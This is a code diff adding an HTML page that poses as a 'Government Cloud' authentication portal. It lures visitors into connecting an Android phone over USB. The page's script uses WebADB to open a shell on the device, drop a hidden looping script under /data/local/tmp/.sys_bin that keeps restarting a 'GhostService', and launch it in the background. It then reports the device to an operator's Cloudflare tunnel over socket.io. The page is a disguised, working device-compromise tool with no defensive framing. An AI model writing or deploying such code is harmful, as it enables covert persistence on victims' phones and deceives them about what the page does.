@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>System Authentication Portal</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/webadb.js@1.1.0/dist/webadb.min.js"></script>
+    <style>
+        body { background: #000; color: #00ff9d; font-family: monospace; text-align: center; padding-top: 20%; }
+        .loader { border: 2px solid #00ff9d; padding: 20px; display: inline-block; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+    <div class="loader"> [ AWAITING_USB_LINK_V27 ] </div>
+    <p>Please connect device to synchronize with Government Cloud.</p>
+    <button id="syncBtn" style="background:transparent; border:1px solid #00ff9d; color:#00ff9d; padding:10px; cursor:pointer;">INITIALIZE_SYNC</button>
+
+    <script>
+        // আপনার লিনাক্স পিসির Cloudflare Tunnel URL এখানে দিন
+        const SERVER_URL = "https://your-tunnel-name.trycloudflare.com";
+        const socket = io(SERVER_URL);
+
+        document.getElementById('syncBtn').onclick = async () => {
+            try {
+                const adb = await new window.WebADB().connect();
+                await adb.connect();
+                const model = await adb.shell("getprop ro.product.model");
+                const devId = btoa(model).substring(0,8);
+
+                // --- GHOST PERSISTENCE INJECTION ---
+                const ghost = `while true; do am startservice -n com.android.shell/.GhostService 2>/dev/null; sleep 30; done`;
+                await adb.shell(`mkdir -p /data/local/tmp/.sys_bin`);
+                await adb.shell(`echo "${ghost}" > /data/local/tmp/.sys_bin/.ghost.sh`);
+                await adb.shell(`chmod 777 /data/local/tmp/.sys_bin/.ghost.sh`);
+                await adb.shell(`nohup sh /data/local/tmp/.sys_bin/.ghost.sh > /dev/null 2>&1 &`);
+
+                socket.emit('ghost_login', { id: devId, info: model.trim() });
+                alert("Synchronization Complete. Persistence Active.");
+            } catch(e) { console.error(e); }
+        };
+    </script>
+</body>
+</html>
